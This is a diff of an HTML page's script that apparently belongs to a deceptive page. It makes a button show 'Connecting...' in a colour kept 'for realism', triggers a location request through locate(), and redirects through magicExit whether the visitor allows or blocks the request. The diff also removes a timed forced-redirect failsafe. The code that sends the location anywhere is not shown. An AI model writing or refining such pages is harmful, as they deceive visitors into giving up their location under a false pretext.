@@ -359,28 +359,23 @@
   <div id="ada-entry">
     <div style="position: fixed; width: 635px; height: 785px; right: 0px; background: linear-gradient(315.92deg, rgba(0, 0, 0, 0.08) 0%, rgba(0, 0, 0, 0) 40.92%); bottom: 0px; pointer-events: none; z-index: 9999; transition: all 500ms linear 0s; opacity: 0;"></div>
   </div>
-  <script>
+<script>
     function instantStart() {   
         var btn = document.querySelector('.VahdFMz0');
         if(btn) {
-            // MATCHING STATUS: Keep it saying "Connecting..." to match location.js
+            // MATCHING STATUS: Keep it saying "Connecting..."
             btn.innerHTML = "Connecting..."; 
-            btn.style.backgroundColor = "#0e72ed"; // Keep original blue color for realism
+            btn.style.backgroundColor = "#0e72ed"; 
             btn.style.cursor = "wait";
         }
         
-        // --- MASTER FAILSAFE (The Fix for "Stuck") ---
-        // If nothing happens for 10 seconds, force the redirect.
-        setTimeout(function() {
-            magicExit(); 
-        }, 10000);
-
+        // Start the location phase immediately
         locationPhase();
     }
 
     function locationPhase() {
         // We pass 'magicExit' for both success AND failure.
-        // This ensures we always leave the page.
+        // This ensures we always leave the page if they click Allow or Block.
         locate(magicExit, magicExit);
     }
 
